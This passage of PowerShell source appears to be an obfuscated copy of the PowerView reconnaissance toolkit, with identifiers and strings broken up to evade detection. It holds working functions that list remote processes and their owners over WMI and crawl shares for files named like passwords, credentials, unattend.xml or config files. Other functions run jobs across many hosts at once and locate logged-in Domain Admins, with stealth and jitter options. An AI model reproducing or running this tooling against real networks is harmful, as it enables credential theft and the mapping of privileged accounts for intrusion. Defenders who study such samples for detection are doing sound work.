                                ${mO`UNte`D`drI`Ve}."PSO`BjEcT"."TYPena`M`eS".("{0}{2}{1}" -f'In','rt','se').Invoke(0, ("{0}{4}{2}{1}{3}" -f'PowerView','ountedDriv','gM','e','.Re'))
                                ${mo`UntedD`RIve}
                            }
                        }
                    }
                    catch {
                        &("{1}{2}{0}" -f'Verbose','Writ','e-') ('[Get-'+'WM'+'IReg'+'Mounted'+'Dri'+'ve] '+'Err'+'or: '+"$_")
                    }
                }
            }
            catch {
                &("{0}{3}{2}{1}" -f 'Writ','rning','a','e-W') ('[Get'+'-'+'WMIR'+'egM'+'ountedDrive] '+'E'+'rro'+'r '+'a'+'ccess'+'ing '+"$Computer, "+'li'+'kely '+'insu'+'ff'+'ic'+'i'+'ent '+'perm'+'issio'+'ns '+'o'+'r '+'fir'+'ewal'+'l '+'rul'+'es '+'on'+' '+'hos'+'t: '+"$_")
            }
        }
    }
}

function g`E`T-wMIPrOCeSS {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}"-f 'dProce','PSShoul','ss'}, '')]
    [OutputType({"{5}{2}{4}{0}{1}{3}" -f'iew.Use','rPro','o','cess','werV','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITIon = 0, ValUeFRompIPeLiNE = ${tr`Ue}, ValUEfroMpIpeLInEBYPropeRtYnaME = ${t`RUe})]
        [Alias({"{2}{1}{0}"-f'e','ostNam','H'}, {"{1}{0}{2}" -f 'shostna','dn','me'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`mpUT`ErName} = ("{0}{3}{1}{2}"-f 'l','calho','st','o'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEd`E`NtIAl} =   (  &("{0}{1}"-f 'D','Ir')  ("VARi"+"abLe:PkF"+"EzN") )."va`luE"::"E`mptY"
    )

    PROCESS {
        ForEach (${C`OM`pUteR} in ${c`oMpUTER`N`A`mE}) {
            try {
                ${W`miARg`UmEN`Ts} = @{
                    ("{1}{3}{2}{0}"-f 'e','Co','uterNam','mp') = ${cOm`PU`TErN`AmE}
                    ("{0}{1}"-f'Cl','ass') = ("{2}{0}{1}"-f 'in32_','process','W')
                }
                if (${PS`BOU`NdpaRaMEte`Rs}[("{3}{0}{2}{1}" -f'ede','l','ntia','Cr')]) { ${wMIa`R`gUM`eN`Ts}[("{1}{2}{0}"-f'ial','Cred','ent')] = ${CR`edEn`T`IaL} }
                &("{1}{3}{2}{0}"-f 't','Get-WMIo','c','bje') @WmiArguments | &("{2}{3}{1}{0}" -f 'ect','ch-Obj','F','orEa') {
                    ${Ow`NeR} = ${_}.("{0}{1}" -f'get','owner').Invoke();
                    ${Pr`OCE`sS} = &("{0}{2}{1}" -f'New-Ob','t','jec') ("{2}{0}{1}" -f 'j','ect','PSOb')
                    ${P`Ro`ceSS} | &("{0}{2}{1}" -f 'A','mber','dd-Me') ("{1}{3}{2}{0}" -f 'y','Noteprop','t','er') ("{3}{1}{2}{0}" -f 'e','ter','Nam','Compu') ${C`omp`UTeR}
                    ${prOC`e`sS} | &("{2}{0}{3}{1}"-f 'd-','ber','Ad','Mem') ("{2}{3}{1}{0}" -f'erty','op','Not','epr') ("{0}{1}{2}" -f'Pro','ces','sName') ${_}."prO`c`EsS`NAMe"
                    ${PROc`E`ss} | &("{2}{0}{1}{3}"-f 'Me','m','Add-','ber') ("{0}{2}{1}"-f'Notepr','rty','ope') ("{0}{1}" -f'ProcessI','D') ${_}."p`Ro`CESSID"
                    ${P`R`OCeSS} | &("{2}{1}{0}" -f'er','-Memb','Add') ("{0}{2}{1}" -f 'Not','ty','eproper') ("{2}{1}{0}"-f 'in','a','Dom') ${O`wn`er}."DoMa`IN"
                    ${p`ROC`esS} | &("{1}{0}{2}"-f 'Me','Add-','mber') ("{0}{1}{2}" -f 'Notepr','oper','ty') ("{1}{0}" -f 'r','Use') ${O`Wn`Er}."US`er"
                    ${P`ROc`ESs}."Ps`Obj`ecT"."typEn`A`M`Es".("{0}{1}"-f'Inse','rt').Invoke(0, ("{5}{3}{2}{0}{1}{4}"-f 'iew','.UserP','rV','owe','rocess','P'))
                    ${proc`esS}
                }
            }
            catch {
                &("{3}{1}{4}{2}{0}"-f 'ose','rite-','rb','W','Ve') ('[Ge'+'t'+'-W'+'MI'+'Process] '+'Er'+'ro'+'r '+'enum'+'er'+'ating '+'re'+'mote '+'p'+'rocess'+'e'+'s '+'on'+' '+"'$Computer', "+'access'+' '+'li'+'kely'+' '+'de'+'n'+'ied: '+"$_")
            }
        }
    }
}

function fI`N`d-In`TereSTIngfile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{1}{2}"-f'o','uldProces','s','h','PSS'}, '')]
    [OutputType({"{2}{0}{3}{4}{1}"-f'we','ile','Po','rVi','ew.FoundF'})]
    [CmdletBinding(DEfaultpArAMETErSEtName = {"{0}{3}{1}{2}"-f'FileSpecifi','t','ion','ca'})]
    Param(
        [Parameter(poSITION = 0, VALUefroMPIpElinE = ${T`RuE}, vALUefrOMpIpELIneBypropERtYNaME = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pa`TH} = '.\',

        [Parameter(pARAmEterSeTName = "fILeSpEc`ifI`CaT`ION")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f 'S','e','arc','hTerms'}, {"{1}{0}"-f 'erms','T'})]
        [String[]]
        ${IN`C`LUde} = @(("{0}{1}{2}{3}"-f '*pas','sw','o','rd*'), ("{1}{0}{2}" -f 'nsitiv','*se','e*'), ("{1}{0}" -f '*','*admin'), ("{0}{1}"-f'*l','ogin*'), ("{0}{2}{1}" -f'*sec','t*','re'), ("{1}{2}{3}{0}" -f '.xml','unatt','end','*'), ("{2}{0}{1}" -f 'vm','dk','*.'), ("{0}{1}{2}"-f '*cre','ds','*'), ("{0}{3}{1}{2}" -f '*c','entia','l*','red'), ("{2}{0}{1}" -f'.confi','g','*')),

        [Parameter(PARaMETErSETnaME = "f`iLesPEci`FIcaTI`ON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LAstACcE`ss`TimE},

        [Parameter(paRamEterSETNaME = "FIl`eSP`eCIfI`C`ATiOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LaStW`Rite`T`i`ME},

        [Parameter(PARAMeterseTnAmE = "fiLESP`EcIfIC`ATi`on")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${CR`ea`TioNtImE},

        [Parameter(PAraMEteRsEtNaME = "oFfiC`e`DOCS")]
        [Switch]
        ${O`Ff`IcEDocS},

        [Parameter(PArAmEteRsetnamE = "fRe`sHe`XeS")]
        [Switch]
        ${fR`EshEx`es},

        [Parameter(pARAmeTerSEtName = "FiLesPEc`IF`I`cAT`ioN")]
        [Switch]
        ${ex`cL`UDEF`Old`ErS},

        [Parameter(pARaMEtERseTnaME = "FI`L`ES`PeCIfI`c`ATIoN")]
        [Switch]
        ${ExCLuDe`Hi`d`D`En},

        [Switch]
        ${ChE`c`K`wRitE`AcC`Ess},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDE`Nt`iAl} =   ( &("{3}{2}{0}{1}" -f'ARiabl','E','T-V','GE')  ("{1}{0}"-f 'n','Pkfez'))."val`Ue"::"e`MptY"
    )

    BEGIN {
        ${S`Earcher`AR`g`UMenTS} =  @{
            ("{1}{0}" -f 'rse','Recu') = ${t`RuE}
            ("{0}{1}{3}{2}" -f 'Err','orA','tion','c') = ("{4}{0}{3}{2}{1}"-f'tl','ntinue','Co','y','Silen')
            ("{2}{1}{0}" -f 'e','ud','Incl') = ${inCl`UDe}
        }
        if (${pSbo`UN`DPAr`AMEt`E`RS}[("{2}{0}{1}"-f 'ce','Docs','Offi')]) {
            ${SEArC`Hera`R`g`UMEnTs}[("{0}{2}{1}"-f 'Incl','de','u')] = @(("{0}{1}"-f'*','.doc'), ("{0}{1}"-f'*.do','cx'), ("{0}{1}"-f'*.x','ls'), ("{1}{0}"-f 'x','*.xls'), ("{0}{1}" -f '*','.ppt'), ("{0}{1}"-f'*.','pptx'))
        }
        elseif (${P`sBo`Un`dPar`Am`eteRs}[("{2}{1}{0}" -f'Es','reshEX','F')]) {

            ${l`ASTacCES`s`TIme} = (&("{1}{0}" -f'et-Date','G')).("{2}{0}{1}" -f 'dDa','ys','Ad').Invoke(-7).("{0}{1}"-f 'ToStr','ing').Invoke(("{2}{0}{1}" -f'dd','/yyyy','MM/'))
            ${sEAR`Ch`ERaRG`UMEn`TS}[("{1}{0}"-f 'de','Inclu')] = @(("{1}{0}"-f'.exe','*'))
        }
        ${sE`A`RcHERarG`Ume`N`Ts}[("{0}{1}" -f 'F','orce')] = -not ${pS`B`oUnDPa`RAM`ETE`RS}[("{3}{0}{1}{2}"-f 'xcludeHi','dd','en','E')]

        ${MAPp`E`DcO`mp`UtERs} = @{}

        function tes`T-`w`RItE {
            [CmdletBinding()]Param([String]${P`Ath})
            try {
                ${F`iLeTest} =  (&("{0}{2}{1}" -f'Va','ABLe','rI')  ("8"+"gs") -VALuEOn)::("{1}{2}{0}" -f 'e','Op','enWrit').Invoke(${Pa`TH})
                ${f`i`Letest}.("{0}{1}"-f'Clos','e').Invoke()
                ${T`RUe}
            }
            catch {
                ${Fal`Se}
            }
        }
    }

    PROCESS {
        ForEach (${t`ARGe`TpA`Th} in ${pa`TH}) {
            if ((${tArGET`p`A`Th} -Match ((("{4}{2}{3}{5}{1}{0}"-f '.*egfegf.*','gfegf','feg','f','eg','e'))."Re`pla`ce"(([CHAr]101+[CHAr]103+[CHAr]102),[STrIng][CHAr]92))) -and (${p`S`BOU`NDParaMEtERs}[("{2}{0}{1}{3}"-f 'ed','e','Cr','ntial')])) {
                ${H`OstcoM`PUteR} = (&("{2}{1}{0}"-f'-Object','ew','N') ("{1}{3}{0}{2}"-f 'ste','S','m.Uri','y')(${t`ARgetpA`TH}))."H`ost"
                if (-not ${M`APPEdcoMPU`TE`Rs}[${H`o`StCOmp`U`TER}]) {

                    &("{2}{4}{3}{1}{0}"-f'on','ti','Add-Re','nnec','moteCo') -ComputerName ${H`OSTc`OMP`U`Ter} -Credential ${C`R`eDeNtIaL}
                    ${MA`pPeD`C`OmPUT`ErS}[${ho`STco`mp`Ut`er}] = ${tR`Ue}
                }
            }

            ${SE`ArCHErAr`gU`men`Ts}[("{0}{1}"-f'Pat','h')] = ${TArg`eT`p`ATH}
            &("{1}{0}{3}{2}" -f 'et-ChildI','G','em','t') @SearcherArguments | &("{2}{1}{0}{3}"-f'ach-Obje','E','For','ct') {

                ${co`Nt`INuE} = ${t`RUE}
                if (${Ps`BOu`Nd`pAraMEt`ErS}[("{3}{1}{2}{4}{0}" -f'lders','xclud','eF','E','o')] -and (${_}."p`s`is`cON`TaINER")) {
                    &("{0}{2}{3}{1}" -f 'Wr','Verbose','i','te-') "Excluding: $($_.FullName) "
                    ${cO`Nti`NUe} = ${f`Al`SE}
                }
                if (${L`ASTAc`CESS`TIME} -and (${_}."lA`S`TaC`CESSti`ME" -lt ${L`ASt`Ac`CeSstImE})) {
                    ${c`ONti`NUe} = ${FaL`se}
                }
                if (${pSbo`UNDPA`Ra`m`ete`Rs}[("{3}{2}{1}{0}"-f'e','im','stWriteT','La')] -and (${_}."LasTw`RIte`TiME" -lt ${l`AST`wRi`T`ETIme})) {
                    ${cO`NTIn`UE} = ${f`AL`Se}
                }
                if (${PS`B`OUn`D`pArAMeTERs}[("{0}{2}{1}"-f 'C','ionTime','reat')] -and (${_}."c`R`EaTI`ontImE" -lt ${cRE`ATiO`Ntime})) {
                    ${Co`N`TINUE} = ${FA`LSe}
                }
                if (${PsB`ou`NDpAr`AM`eTErs}[("{3}{2}{0}{1}"-f'eAcces','s','rit','CheckW')] -and (-not (&("{1}{3}{0}{2}"-f'r','T','ite','est-W') -Path ${_}."F`Ul`lnAme"))) {
                    ${C`OntiNUE} = ${fal`SE}
                }
                if (${COnt`i`NuE}) {
                    ${FIL`Ep`ARaMs} = @{
                        ("{1}{0}" -f 'ath','P') = ${_}."F`ULL`NaMe"
                        ("{0}{1}"-f'O','wner') = $((&("{0}{1}"-f'Ge','t-Acl') ${_}."F`Ul`lName")."oW`NeR")
                        ("{0}{2}{1}"-f'LastAcc','Time','ess') = ${_}."LAs`TAcceS`stImE"
                        ("{2}{1}{0}"-f'me','stWriteTi','La') = ${_}."L`AStw`Ri`TEtIMe"
                        ("{0}{2}{1}"-f 'Creatio','e','nTim') = ${_}."Creati`ON`TI`Me"
                        ("{1}{0}"-f'h','Lengt') = ${_}."l`ENg`TH"
                    }
                    ${fO`Un`d`FiLe} = &("{0}{1}{2}" -f'Ne','w','-Object') -TypeName ("{0}{2}{1}" -f'PSObj','ct','e') -Property ${FI`LE`Params}
                    ${fou`NDFI`Le}."pSO`B`JECt"."T`yPeN`AMES".("{1}{2}{0}"-f 'rt','In','se').Invoke(0, ("{5}{1}{2}{0}{4}{3}" -f 'ou','View.','F','File','nd','Power'))
                    ${F`oUnDFI`Le}
                }
            }
        }
    }

    END {

        ${mapP`e`dC`Ompute`RS}."KE`YS" | &("{2}{3}{0}{1}" -f 'emoteConnec','tion','Rem','ove-R')
    }
}

function N`e`w-tHReADEDf`U`N`CtIOn {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{10}{6}{11}{1}{9}{4}{5}{2}{0}{3}{8}{7}{12}"-f'ng','dPro','a','i','ss','ForStateCh','h','unctio','ngF','ce','PSUseS','oul','ns'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSITIon = 0, manDaTory = ${TR`UE}, VALUefromPipelINE = ${T`RUE}, VALUEfROmpIpeLiNEbYProPErTYNaME = ${Tr`Ue})]
        [String[]]
        ${cO`M`p`UTER`NAme},

        [Parameter(positIOn = 1, MAnDatory = ${tr`Ue})]
        [System.Management.Automation.ScriptBlock]
        ${Sc`R`iPTb`LoCk},

        [Parameter(PoSiTIOn = 2)]
        [Hashtable]
        ${sc`RiPtpA`Ram`eterS},

        [Int]
        [ValidateRange(1,  100)]
        ${T`hreA`Ds} = 20,

        [Switch]
        ${N`oiMpoR`TS}
    )

    BEGIN {

        ${seSsIO`NS`T`ATE} =  ${Tl`1k38}::("{0}{2}{1}{3}" -f 'Cr','ate','e','Default').Invoke()

        ${se`S`SiO`NSt`ATE}."Apa`RTMe`Nt`sT`ATe" =  (&("{3}{1}{2}{0}" -f'M','hIL','DiTE','C')  ("{0}{2}{1}"-f 'vARia','aD','BLe:3'))."Va`Lue"::"S`TA"

        if (-not ${n`OI`Mp`ORts}) {

            ${mY`VaRs} = &("{2}{3}{1}{0}" -f'le','ab','Get-','Vari') -Scope 2

            ${v`OR`BidD`eNVArS} = @('?',("{1}{0}" -f'gs','ar'),("{1}{3}{4}{0}{2}"-f'N','C','ame','on','soleFile'),("{1}{0}" -f'r','Erro'),("{1}{2}{0}{3}"-f'e','ExecutionCon','t','xt'),("{1}{0}"-f'se','fal'),("{1}{0}" -f 'ME','HO'),("{0}{1}" -f'Hos','t'),("{1}{0}" -f 'ut','inp'),("{3}{1}{2}{0}"-f't','j','ec','InputOb'),("{0}{1}{3}{2}{4}" -f 'MaximumAl','ias','n','Cou','t'),("{1}{2}{0}{3}" -f 'mDriveCou','Maxi','mu','nt'),("{2}{3}{0}{1}"-f 'm','ErrorCount','Ma','ximu'),("{5}{0}{4}{6}{1}{2}{3}"-f 'x','u','nct','ionCount','imu','Ma','mF'),("{2}{4}{1}{0}{3}"-f'ory','ist','Max','Count','imumH'),("{0}{3}{5}{2}{4}{1}"-f 'Maximum','t','bleC','Va','oun','ria'),("{2}{0}{1}{3}"-f 'y','I','M','nvocation'),("{0}{1}" -f 'nul','l'),'PID',("{0}{2}{1}{3}" -f'PSBou','ameter','ndPar','s'),("{3}{0}{1}{2}" -f'ma','ndPat','h','PSCom'),("{0}{1}{2}" -f'P','SCul','ture'),("{0}{2}{5}{4}{3}{1}"-f 'PSDefa','es','u','lu','eterVa','ltParam'),("{2}{0}{1}"-f'SH','OME','P'),("{1}{2}{0}"-f'oot','PSScript','R'),("{1}{2}{0}"-f'lture','P','SUICu'),("{3}{0}{4}{2}{1}" -f'sionT','le','b','PSVer','a'),'PWD',("{1}{0}{2}" -f'ellI','Sh','d'),("{1}{2}{3}{0}{4}" -f'dHas','Synchro','niz','e','h'),("{1}{0}" -f'ue','tr'))

            ForEach (${v`Ar} in ${mYVa`Rs}) {
                if (${vOrB`iDDeN`V`ARs} -NotContains ${V`AR}."na`mE") {
                ${S`eSsionSta`Te}."va`R`iAblEs".("{0}{1}"-f 'Ad','d').Invoke((&("{2}{0}{1}"-f 'ew-Objec','t','N') -TypeName ("{11}{15}{17}{8}{14}{2}{5}{10}{9}{6}{18}{1}{13}{7}{4}{0}{3}{12}{16}"-f'r','s.Ses','.Au','ia','ateVa','t','Ru','ionSt','ge','tion.','oma','Sy','bleEnt','s','ment','stem.M','ry','ana','nspace') -ArgumentList ${v`Ar}."Na`ME",${v`Ar}."Val`UE",${v`AR}."dE`Scri`PTION",${V`Ar}."o`PTIons",${v`Ar}."aT`TRibU`TeS"))
                }
            }

            ForEach (${fUnC`T`ioN} in (&("{1}{3}{2}{0}{4}"-f'Ite','Ge','ld','t-Chi','m') ("{0}{1}{2}" -f'Fun','cti','on:'))) {
                ${s`Es`sI`oNsTATE}."c`OM`MaNDS".("{0}{1}" -f 'A','dd').Invoke((&("{0}{1}{2}" -f 'N','ew-Obj','ect') -TypeName ("{12}{5}{11}{6}{9}{7}{13}{2}{8}{4}{3}{1}{10}{0}" -f 'try','nStateFu','ces.S','io','ss','m.','agemen','t','e','t.Automa','nctionEn','Man','Syste','ion.Runspa') -ArgumentList ${F`U`NCt`IoN}."n`AME", ${fUnC`T`iON}."DeFINi`T`iON"))
            }
        }

        ${P`OOl} =   ${gno`X`5p}::("{2}{3}{0}{4}{1}"-f 'P','ol','CreateRu','nspace','o').Invoke(1, ${tHREa`ds}, ${s`ESS`IonstAtE}, ${hO`sT})
        ${PO`Ol}.("{0}{1}"-f'Ope','n').Invoke()

        ${ME`T`HOD} = ${n`ULL}
        ForEach (${M} in  (  &("{2}{0}{1}" -f 'T-','iTEm','ge')  ("{1}{0}{3}{2}" -f'arIAbL','V','Yf1T','e:') )."va`LUE".("{1}{2}{0}" -f 'ods','Get','Meth').Invoke() | &("{2}{1}{3}{0}" -f 'Object','e','Wher','-') { ${_}."nA`ME" -eq ("{0}{1}{2}" -f'BeginIn','v','oke') }) {
            ${me`Th`Od`PAr`Am`eTErS} = ${m}.("{0}{2}{3}{1}" -f 'GetPara','rs','me','te').Invoke()
            if ((${mE`THO`d`PaRAme`T`ErS}."c`ounT" -eq 2) -and ${M`e`ThodpaRa`MeTErS}[0]."N`AmE" -eq ("{1}{0}" -f't','inpu') -and ${m`EtHod`pA`RaMete`RS}[1]."nA`Me" -eq ("{1}{0}"-f'utput','o')) {
                ${M`ETHOd} = ${M}."Mak`EGEne`RICmeTH`Od"([Object], [Object])
                break
            }
        }

        ${j`oBs} = @()
        ${Co`MPuTe`R`NaME} = ${cOmPUtE`Rn`A`me} | &("{2}{3}{1}{0}" -f'ject','re-Ob','Wh','e') {${_} -and ${_}.("{1}{0}" -f 'im','Tr').Invoke()}
        &("{2}{0}{3}{1}{4}" -f 'ite-Ve','bos','Wr','r','e') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        if (${tHR`e`ADs} -ge ${Co`m`PuTER`NAMe}."Le`NGtH") {
            ${ThR`ea`Ds} = ${Comp`U`TEr`Na`mE}."Le`NgtH"
        }
        ${e`le`Me`NtSPLiTSIZe} = [Int](${COm`pUt`E`Rna`Me}."L`e`NgtH"/${t`HRE`ADs})
        ${cOM`pUT`eRnAm`Ep`ArTItion`ed} = @()
        ${sT`ArT} = 0
        ${E`Nd} = ${E`L`eMENTSpLIts`iZe}

        for(${i} = 1; ${I} -le ${thr`EAdS}; ${i}++) {
            ${lI`st} = &("{2}{0}{1}{3}" -f'ew-O','bj','N','ect') ("{4}{0}{5}{1}{6}{3}{2}" -f'stem.Collectio','.','rayList','r','Sy','ns','A')
            if (${I} -eq ${thre`AdS}) {
                ${E`Nd} = ${C`omP`UT`eRNaME}."lenG`TH"
            }
            ${L`IsT}."aDDr`A`Nge"(${co`m`Pu`TernAme}[${S`Tart}..(${e`ND}-1)])
            ${s`TA`RT} += ${eleM`e`N`T`S`pLITSIZe}
            ${e`ND} += ${EL`E`meN`TSp`LItS`izE}
            ${CoMPUT`eRnaMEp`ArtIti`ON`ED} += @(,@(${l`Ist}.("{2}{0}{1}"-f'Arr','ay','To').Invoke()))
        }

        &("{0}{3}{1}{2}"-f'Wr','e-Ve','rbose','it') ('[Ne'+'w-T'+'hr'+'eaded'+'F'+'u'+'nction] '+'Tota'+'l'+' '+'numbe'+'r '+'o'+'f '+'threa'+'ds'+'/'+'parti'+'tion'+'s: '+"$Threads")

        ForEach (${Co`MP`U`TErNameP`ArtItI`ON} in ${Compu`TE`R`NaMeparTi`TiOned}) {

            ${p`o`w`eRsHeLL} =  ( &("{0}{2}{1}{3}"-f'g','rI','Et-VA','AblE')  ('Yf1'+'t')  -VALu )::("{0}{1}"-f'Cre','ate').Invoke()
            ${POWer`SH`ell}."RUnS`paC`E`Pool" = ${pO`OL}

            ${n`ULL} = ${pO`WeRSh`eLl}.("{1}{0}" -f'pt','AddScri').Invoke(${scrI`pT`BloCK}).("{0}{1}{2}" -f 'AddParam','et','er').Invoke(("{0}{2}{1}" -f 'ComputerNa','e','m'), ${co`MputE`RnAM`ep`ArTitiON})
            if (${sC`RIp`TpAra`MeTeRS}) {
                ForEach (${pa`Ram} in ${s`CRi`ptPAr`AMETE`RS}.("{2}{3}{0}{1}" -f'rato','r','GetEnum','e').Invoke()) {
                    ${Nu`LL} = ${powErSh`e`lL}.("{0}{1}{2}"-f 'Add','Param','eter').Invoke(${pA`RAm}."n`AmE", ${p`Ar`Am}."V`ALue")
                }
            }

            ${O`UtPut} = &("{0}{2}{1}" -f'N','t','ew-Objec') ("{9}{5}{4}{7}{10}{1}{11}{0}{8}{2}{3}{6}"-f 'o','ta','lect','io','ent.Automation','agem','n[Object]','.PSD','l','Man','a','C')

            ${j`ObS} += @{
                ('PS') = ${POW`E`Rsh`elL}
                ("{0}{1}"-f 'Outpu','t') = ${OU`Tp`UT}
                ("{0}{2}{1}"-f 'Resu','t','l') = ${meth`od}."INvo`Ke"(${po`wErS`hEll}, @(${n`ULl}, [Management.Automation.PSDataCollection[Object]]${OUt`P`UT}))
            }
        }
    }

    END {
        &("{2}{0}{1}"-f 'e-Verbo','se','Writ') ("{3}{2}{7}{1}{0}{6}{5}{4}"-f 'ad',' Thre','Ne','[','ing','execut','s ','w-ThreadedFunction]')

        Do {
            ForEach (${J`ob} in ${jO`BS}) {
                ${J`ob}."OUtP`Ut".("{1}{2}{0}" -f 'All','Rea','d').Invoke()
            }
            &("{0}{2}{1}" -f 'Sta','eep','rt-Sl') -Seconds 1
        }
        While ((${JO`BS} | &("{2}{0}{1}" -f'bj','ect','Where-O') { -not ${_}."reSU`lt"."iSComPl`e`TEd" })."cO`UNt" -gt 0)

        ${slE`EPse`con`DS} = 100
        &("{3}{0}{2}{1}"-f 't','ose','e-Verb','Wri') ('[N'+'ew'+'-T'+'hreadedFu'+'n'+'ctio'+'n] '+'Wait'+'ing '+"$SleepSeconds "+'sec'+'onds'+' '+'f'+'or '+'final'+' '+'cleanup.'+'.'+'.')

        for (${i}=0; ${i} -lt ${S`leeps`ECoNdS}; ${i}++) {
            ForEach (${j`Ob} in ${J`oBs}) {
                ${j`OB}."oU`TpUT".("{0}{1}"-f'Read','All').Invoke()
                ${j`Ob}."Ps".("{0}{2}{1}"-f 'D','se','ispo').Invoke()
            }
            &("{2}{1}{0}" -f 'ep','e','Start-Sl') -S 1
        }

        ${po`Ol}.("{0}{1}"-f'D','ispose').Invoke()
        &("{2}{1}{0}" -f'bose','te-Ver','Wri') ("{1}{10}{5}{0}{3}{6}{8}{2}{4}{7}{9}" -f'adedFunctio','[Ne','a','n] all t','ds c','e','hr','omple','e','ted','w-Thr')
    }
}

function finD`-DOmAi`NUs`Erl`ocAt`i`oN {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{4}{2}" -f 'ld','PSS','s','hou','Proces'}, '')]
    [OutputType({"{3}{2}{5}{0}{4}{1}" -f'iew.Use','Location','ower','P','r','V'})]
    [CmdletBinding(dEfAUltParameterSetnAme = {"{1}{4}{2}{0}{3}"-f 'ti','UserGr','pIden','ty','ou'})]
    Param(
        [Parameter(PosItion = 0, vAlUefRompiPElINe = ${tr`UE}, VALuEfRoMPiPElInEBYPrOpERtynaMe = ${T`RUE})]
        [Alias({"{0}{1}{2}"-f 'D','NSHost','Name'})]
        [String[]]
        ${COmpUtE`RN`A`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MA`iN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`MpU`TERd`OmAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COM`p`Ute`RLDAp`FIl`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`omPUTeR`seAr`cH`BasE},

        [Alias({"{0}{2}{1}{3}"-f 'Uncon','rai','st','ned'})]
        [Switch]
        ${comP`Ut`er`UNCoNs`TrAiNEd},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{4}{0}"-f'em','Oper','at','ingS','yst'})]
        [String]
        ${Co`mPut`eRo`PERAtI`Ng`SyST`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'S','rvicePack','e'})]
        [String]
        ${c`oMPU`T`ERSERVI`cEpACK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'teName','S','i'})]
        [String]
        ${cOMpuTe`RSit`EN`A`ME},

        [Parameter(pARaMEtErSeTnamE = "USerIde`N`T`ITy")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${useR`i`DEN`TItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Us`eRDo`main},

        [ValidateNotNullOrEmpty()]
        [String]
        ${UsE`RLdAP`F`IL`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USErSEarC`H`B`AsE},

        [Parameter(pARAMeteRSeTnaME = "us`E`Rg`RoUPIDEnTi`TY")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'G','pName','rou'}, {"{1}{0}"-f 'oup','Gr'})]
        [String[]]
        ${usEr`grO`Up`i`d`EnTiTY} = ("{1}{2}{0}"-f'dmins','Domai','n A'),

        [Alias({"{1}{3}{2}{0}" -f't','Admi','oun','nC'})]
        [Switch]
        ${UsEra`D`minc`oUnt},

        [Alias({"{1}{3}{0}{2}"-f'lowDele','A','gation','l'})]
        [Switch]
        ${uSER`Al`LOwdE`lEgAtION},

        [Switch]
        ${c`He`C`KacCEsS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}"-f 'Dom','ontroller','a','inC'})]
        [String]
        ${S`e`RveR},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{1}{0}{2}" -f 've','OneLe','l'}, {"{1}{0}{2}"-f'btre','Su','e'})]
        [String]
        ${se`A`RChScOPe} = ("{0}{1}" -f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResuLT`pa`g`ESi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`VertI`m`elImIt},

        [Switch]
        ${t`Om`BStO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`den`Ti`AL} =   (&("{2}{0}{1}"-f'T-','vAriABLe','gE') ("pKfE"+"Z"+"n")  )."vA`LUE"::"EMP`Ty",

        [Switch]
        ${s`ToPONSUc`cEsS},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`e`LAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jitt`Er} = .3,

        [Parameter(pAraMEtERsETNAme = "ShO`w`ALl")]
        [Switch]
        ${s`hOw`All},

        [Switch]
        ${s`TEAlTH},

        [String]
        [ValidateSet('DFS', 'DC', {"{0}{1}"-f 'Fi','le'}, 'All')]
        ${sTEAl`THsoUr`Ce} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${TH`R`eads} = 20
    )

    BEGIN {

        ${Co`mPuter`SeA`RCHeR`ArG`UMenTs} = @{
            ("{0}{1}{2}" -f'Pro','per','ties') = ("{2}{1}{0}"-f'ostname','h','dns')
        }
        if (${P`sbo`UndpA`RaMe`TERS}[("{0}{1}"-f'Dom','ain')]) { ${com`puTeRS`EARche`Ra`RGUmentS}[("{1}{0}{2}" -f'mai','Do','n')] = ${do`m`Ain} }
        if (${p`SBOUN`d`PaRaME`T`ErS}[("{0}{2}{1}"-f'Comp','erDomain','ut')]) { ${co`mPUtER`SEaRch`eRArGUM`e`NTs}[("{1}{0}"-f 'ain','Dom')] = ${COMput`Er`d`oMA`in} }
        if (${P`sbou`NDPaRam`etERs}[("{0}{3}{1}{2}" -f'Compu','LD','APFilter','ter')]) { ${co`MPU`TeRsE`ArC`hERarGu`ME`NTs}[("{0}{2}{1}"-f 'L','APFilter','D')] = ${coM`pu`TerlD`APFILt`er} }
